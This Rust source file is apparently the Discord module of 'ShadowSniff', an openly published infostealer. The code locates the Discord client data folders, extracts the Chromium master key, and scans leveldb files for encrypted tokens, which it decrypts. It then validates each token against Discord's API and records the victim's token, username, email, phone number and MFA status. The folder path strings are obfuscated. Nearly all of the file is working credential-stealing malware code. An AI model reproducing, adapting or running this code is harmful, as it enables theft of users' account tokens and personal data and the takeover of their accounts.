/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::alloc::borrow::ToOwned;
use alloc::format;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use browsers::chromium::{decrypt_protected_data, extract_master_key};
use collector::{Collector, Software};
use core::fmt::{Display, Formatter};
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{FileSystem, WriteTo};
use obfstr::obfstr as s;
use requests::{Request, RequestBuilder, ResponseBodyExt};
use tasks::{CompositeTask, Task, impl_composite_task_runner, parent_name};
use utils::base64::base64_decode;

struct TokenValidationTask {
    token: String,
}

impl<C: Collector, F: FileSystem> Task<C, F> for TokenValidationTask {
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(info) = get_token_info(self.token.clone()) else {
            return;
        };

        collector.get_software().increase_discord_tokens();

        let _ = info
            .to_string()
            .write_to(filesystem, parent / format!("{}.txt", info.username));
    }
}

struct TokenWriterTask<C: Collector, F: FileSystem> {
    inner: CompositeTask<C, F>,
}

impl<C: Collector, F: FileSystem> TokenWriterTask<C, F> {
    fn new(tokens: Vec<String>) -> Self {
        let tokens: Vec<Arc<dyn Task<C, F>>> = tokens
            .into_iter()
            .map(|token| TokenValidationTask { token })
            .map(|task| Arc::new(task) as Arc<dyn Task<C, F>>)
            .collect();

        Self {
            inner: CompositeTask::new(tokens),
        }
    }
}

impl_composite_task_runner!(TokenWriterTask<C, F>);

pub(super) struct DiscordTask;

impl<C: Collector, F: FileSystem> Task<C, F> for DiscordTask {
    parent_name!("Discord");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let mut tokens = collect_tokens(&StorageFileSystem, &get_discord_paths());
        tokens.sort();
        tokens.dedup();

        if tokens.is_empty() {
            return;
        }

        TokenWriterTask::new(tokens).run(parent, filesystem, collector);
    }
}

fn get_discord_paths() -> [Path; 4] {
    let appdata = Path::appdata();

    [
        &appdata / s!("discord"),
        &appdata / s!("discordcanary"),
        &appdata / s!("Lightcord"),
        &appdata / s!("discordptb"),
    ]
}

fn collect_tokens<F>(filesystem: &F, paths: &[Path]) -> Vec<String>
where
    F: FileSystem,
{
    let mut result = Vec::new();

    for path in paths {
        if !filesystem.is_exists(path) {
            continue;
        }

        if let Some(master_key) = unsafe { extract_master_key(path) } {
            let scan_path = path / s!("Local Storage") / s!("leveldb");

            if !(filesystem.is_dir(&scan_path)) {
                continue;
            }

            if let Some(tokens) = scan_tokens(filesystem, &scan_path, &master_key) {
                result.extend(tokens);
            }
        }
    }

    result
}

fn scan_tokens<F>(filesystem: &F, scan_path: &Path, master_key: &[u8]) -> Option<Vec<String>>
where
    F: FileSystem,
{
    let mut result = Vec::new();

    let scannable = filesystem.list_files_filtered(scan_path, &|file| {
        file.extension()
            .map(|ext| ext == s!("ldb") || ext == s!("log"))
            .unwrap_or(false)
    })?;

    for entry in scannable {
        let content = filesystem.read_file(&entry).ok()?;
        let encrypted_tokens = extract_encrypted_token_strings(&content);

        for encrypted_token in encrypted_tokens {
            if let Some(decrypted) = decrypt_token(encrypted_token, master_key) {
                result.push(decrypted);
            }
        }
    }

    Some(result)
}

#[inline(always)]
fn decrypt_token(token_slice: &[u8], master_key: &[u8]) -> Option<String> {
    let decoded = base64_decode(token_slice)?;
    let decrypted = decrypt_protected_data(&decoded, Some(master_key), None)?;
    Some(decrypted)
}

fn extract_encrypted_token_strings(input: &[u8]) -> Vec<&[u8]> {
    const PREFIX: &[u8] = b"dQw4w9WgXcQ:";
    const MAX_LOOKAHEAD: usize = 500;
    let mut result = Vec::new();

    let mut i = 0;
    while i <= input.len().saturating_sub(PREFIX.len()) {
        if &input[i..i + PREFIX.len()] == PREFIX {
            let content_start = i + PREFIX.len();
            let max_end = (content_start + MAX_LOOKAHEAD).min(input.len());

            if let Some(rel_end) = input[content_start..max_end]
                .iter()
                .position(|&b| b == b'"')
            {
                let content_end = content_start + rel_end;
                result.push(&input[content_start..content_end]);
                i = content_end + 1;
            } else {
                i += PREFIX.len();
            }
        } else {
            i += 1;
        }
    }

    result
}

struct TokenInfo {
    username: String,
    token: String,
    mfa: bool,
    phone: Option<String>,
    email: Option<String>,
}

impl Display for TokenInfo {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Token: {}\n\
            Username: {}\n\
            Phone: {}\n\
            Email: {}\n\
            MFA: {}",
            self.token,
            self.username,
            self.phone.as_ref().unwrap_or(&"None".to_string()),
            self.email.as_ref().unwrap_or(&"None".to_string()),
            if self.mfa { "Enabled" } else { "Disabled" },
        )
    }
}

fn get_token_info(token: String) -> Option<TokenInfo> {
    let resp = Request::get("https://discord.com/api/v9/users/@me")
        .header("Authorization", &token)
        .header(
            "User-Agent",
            s!("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0"),
        )
        .header("Referer", "https://discord.com/channels/@me")
        .build()
        .send()
        .ok()?;

    if resp.status_code() != 200 {
        return None;
    }

    let json = resp.body().as_json().ok()?;

    Some(TokenInfo {
        username: json.get("username")?.as_string()?.to_owned(),
        token,
        mfa: *json.get("mfa_enabled")?.as_bool()?,
        phone: json.get("phone")?.as_string().map(|s| s.to_owned()),
        email: json.get("email")?.as_string().map(|s| s.to_owned()),
    })
}
